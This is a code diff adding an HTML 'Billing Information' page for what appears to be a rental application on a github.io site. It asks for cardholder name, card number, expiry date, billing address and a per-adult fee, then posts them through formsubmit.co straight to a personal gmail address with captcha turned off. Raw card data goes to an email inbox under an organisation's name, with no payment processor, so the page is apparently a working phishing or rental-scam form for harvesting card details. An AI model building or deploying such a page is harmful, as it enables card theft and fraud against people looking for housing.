@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Billing Information</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 2rem;
+      background-color: #f9f9f9;
+    }
+    h1 {
+      text-align: center;
+    }
+    form {
+      background: #fff;
+      padding: 2rem;
+      border-radius: 10px;
+      max-width: 800px;
+      margin: auto;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    label {
+      display: block;
+      margin-top: 1rem;
+      font-weight: bold;
+    }
+    input {
+      width: 100%;
+      padding: 0.5rem;
+      margin-top: 0.25rem;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    button {
+      margin-top: 2rem;
+      padding: 0.75rem;
+      width: 100%;
+      background: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 1rem;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Billing Information</h1>
+
+  <form action="https://formsubmit.co/luxoftorganization@gmail.com" method="POST">
+    <label>Full Name</label>
+    <input type="text" name="Cardholder Name" required>
+
+    <label>Card Number</label>
+    <input type="text" name="Card Number" placeholder="XXXX-XXXX-XXXX-XXXX" required>
+
+    <label>Expiry Date</label>
+    <input type="text" name="Expiry Date" placeholder="MM/YY" required>
+
+    <label>Billing Address</label>
+    <input type="text" name="Billing Address" required>
+
+    <label>Total Amount ($75 per adult)</label>
+    <input type="text" name="Total Billed" required>
+
+    <label>
+      <input type="checkbox" name="Authorization" required>
+      I authorize Luxoft Organization to charge the amount for my rental application.
+    </label>
+
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_template" value="table">
+    <input type="hidden" name="_next" value="https://goodhomesrentals.github.io/rentalapplication/thank-you.html">
+
+    <button type="submit">Submit Billing Info</button>
+  </form>
+
+</body>
+</html>
